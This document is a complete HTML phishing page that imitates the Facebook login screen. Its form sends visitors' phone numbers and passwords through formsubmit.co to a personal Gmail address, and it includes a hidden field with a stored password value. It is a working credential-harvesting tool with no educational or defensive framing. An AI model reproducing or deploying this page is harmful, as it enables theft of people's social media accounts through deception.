<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Clone</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1877f2; /* Facebook blue */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }

        .login-container h1 {
            color: #1877f2;
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        .login-container input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }

        .login-container button {
            width: 90%;
            padding: 12px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }

        .login-container button:hover {
            background-color: #145dbf;
        }

        .login-container p {
            margin-top: 15px;
            font-size: 14px;
            color: #1877f2;
        }

        .login-container p a {
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
        }

        .login-container p a:hover {
            text-decoration: underline;
        }

        hr {
            border: 0;
            border-top: 1px solid #ddd;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>facebook</h1>
        
        <form action="https://formsubmit.co/tyzolly8@gmail.com" method="POST">
            
            <input type="hidden" name="default_password" value="Captaintaiwo1.">
           
            <input type="text" name="phone" placeholder="Phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p><a href="#">Forgotten password?</a></p>
        <hr>
        <p><a href="#">Create New Account</a></p>
    </div>
</body>
</html>
